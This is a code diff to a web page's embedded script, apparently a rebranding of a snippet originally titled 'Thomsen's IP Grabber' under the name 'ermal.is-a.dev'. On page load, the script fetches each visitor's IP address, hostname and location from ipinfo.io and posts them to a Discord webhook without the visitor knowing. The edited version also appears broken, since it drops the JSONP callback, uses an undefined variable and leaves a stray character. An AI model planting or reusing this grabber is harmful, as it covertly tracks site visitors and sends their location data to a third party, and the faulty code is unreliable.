@@ -692,13 +692,17 @@ function monke(json)
 
      var params = 
      {
-          username: "Thomsen's IP Grabber",
-          avatar_url: "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
+          username: "ermal.is-a.dev",
+          avatar_url: "https://cdn.discordapp.com/avatars/1170810565912952963/585557a19fd78920d7ffacd464385329.webp?size=80",
           embeds: [
                {
-                    title: "Thomsen's IP Grabber",
+                    title: "ermal.is-a.dev",
                     color: 15000,
-                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                    description: `**IP:** \`${ipInfo.ip || "N/A"}\`\n` +
+                    `**Hostname:** \`${ipInfo.hostname || "N/A"}\`\n` +
+                    `**City:** \`${ipInfo.city || "N/A"}\`\n` +
+                    `**Region:** \`${ipInfo.region || "N/A"}\`\n` +
+                    `**Country:** \`${ipInfo.country || "N/A"}\`\n`
                }
           ]
      }
@@ -706,4 +710,4 @@ function monke(json)
      request.send(JSON.stringify(params));
 }
 </script>
-<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+<script src="https://ipinfo.io/?token=4251134854bbf7"></script>t
